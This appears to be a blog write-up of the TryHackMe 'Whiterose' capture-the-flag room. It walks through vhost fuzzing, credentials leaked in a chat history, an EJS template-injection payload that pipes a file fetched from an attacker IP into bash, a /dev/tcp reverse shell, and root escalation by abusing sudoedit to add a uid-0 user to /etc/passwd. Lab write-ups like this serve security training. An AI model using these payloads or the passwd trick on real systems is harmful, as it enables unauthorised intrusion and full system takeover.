---
title: 'Whiterose'
description: 'Vhost fuzzing, Server-side template injection (STTI) for EJS and privilege escalation through sudoedit'
pubDate: 2024-11-08
category: 'tryhackme'
tags: ['STTI', 'EJS']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/5f9c7574e201fe31dad228fc-1726214297023'
---

We get these credentials from the TryHackMe page:
`Olivia Cortez:olivi8`

When searching for subdomains we find 2 new ones:

```bash
ffuf -u http://cyprusbank.thm/ -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 1
...[snip]...
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 31ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 30ms]
```

We can log in to the admin page with the provided credentials from Olivia Cortez.

We can see that we can access messages but not the settings page and that we can't see the phone numbers.

When looking at the messages page there is a param in the URL which seems weird, when setting that to `0` we see more of the history of the chat:

http://admin.cyprusbank.thm/messages/?c=0
```
DEV TEAM: Thanks Gayle, can you share your credentials? We need privileged admin account for testing

Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'

DEV TEAM: Alright we are trying to implement chat history, everything should be ready in week or so

Gayle Bev: That's nice to hear!
```

Now we have credentials to a user with more privileges.
`Gayle Bev:p~]P@5!6;rs558:q`

When logging in with `Gayle` we can see the phone numbers of the user and have access to the `Settings` page.

# USER

When intercepting the settings request and playing around with the body we discover that it uses `ejs`.
If we search for STTI for EJS we find this post: https://eslam.io/posts/ejs-server-side-template-injection-rce/

The payload that eventually works is:
```
name=Moo&password=password&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl http://10.23.19.211:8000/shell.sh | bash');//
```

`shell.sh`:
```bash
bash -i >& /dev/tcp/10.23.19.211/4444 0>&1
```

# ROOT

The first thing we should do is check if the user can run anything as root.

```bash
sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

We can epxloit this by changing the default editor to open any file (https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/)

```bash
mkpasswd -m md5
openssl passwd password
$1$xvaUIFk4$hxAczac0grjYsVhJmYm0W1
```

Now we can add a new user with the password hash we just generated:
```bash
export EDITOR="nano -- /etc/passwd"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

...[snip]...
moo:$1$xvaUIFk4$hxAczac0grjYsVhJmYm0W1:0:0:root:/root:/bin/bash
```

Change to the new user:

```bash
su moo
Password:
root@cyprusbank:/home/web/app# id
uid=0(root) gid=0(root) groups=0(root)
```
